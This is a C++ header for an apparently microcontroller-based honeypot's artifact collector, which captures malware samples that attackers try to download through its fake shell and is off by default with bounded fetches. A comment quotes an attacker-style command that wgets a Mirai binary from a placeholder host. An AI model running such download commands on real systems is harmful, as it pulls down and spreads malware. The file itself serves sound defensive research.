#pragma once
#include "hp_common.h"
#include <ArduinoJson.h>

class WebServer;

// Artifact collector.
//
// When something types `wget http://x/bins/mirai.arm7` into the fake shell, the
// URL alone is a weak indicator — it is dead within hours. The sample itself is
// the durable evidence: it gives you a SHA-256 to look up, an architecture that
// tells you what the operator was targeting, and a file you can hand to a
// sandbox.
//
// The cost is that retrieving it makes an outbound request to the attacker's
// server, confirming the address is live. That is why collection is off by
// default and every fetch is bounded in size, count and total bytes.

static const uint8_t ART_MAX = 24;

struct Artifact {
  char     sha[65];      // hex SHA-256, also the on-flash filename stem
  char     url[200];
  char     kind[30];     // "ELF 32-bit LSB MIPS", "shell script", …
  uint32_t size;
  uint32_t ts;           // unix epoch when first captured, 0 if clock unset
  uint32_t ip;           // who asked for it
  uint16_t seen;         // times this exact sample was requested
};

void artBegin();

// Non-blocking: hands the URL to the collector task and returns immediately.
// Ignored when collection is disabled or the URL is not http(s).
void artQueue(const char* url, uint32_t ip);

void     artListJson(JsonArray out);
uint32_t artCount();
uint32_t artBytes();
uint32_t artFailures();

// Streams a stored sample to the client as an attachment.
bool artStreamBlob(WebServer& srv, const String& sha);

void artClear();
